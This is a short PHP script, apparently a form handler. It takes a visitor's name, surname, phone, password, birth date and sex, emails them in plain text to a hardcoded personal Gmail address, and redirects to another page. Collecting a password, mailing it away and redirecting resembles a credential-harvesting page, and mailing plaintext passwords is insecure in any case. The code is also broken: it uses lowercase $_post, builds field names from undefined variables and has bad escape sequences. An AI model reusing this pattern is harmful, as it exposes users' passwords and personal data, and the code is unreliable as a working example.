<?php
$destino= "victormnoriega30@gmail.com";
$nombre = $_post["$nombre"];
$apellidos = $_post["$apellidos"];
$telefono = $_post["$telefono"];
$contraseña = $_post["$contraseña"];
$fechan = $_post["$fechan"];
$sexo = $_post["$sexo"];
$contenido ="nombre: " . $nombre ."\apellidos" . $apellidos . "\telefono: " . $telefono . "\contraseña" . $contraseña . "\fechan" . $fechan . "\sexo" . $sexo;
mail($destino,"contacto", $contenido);
header("location: index1.html");


?>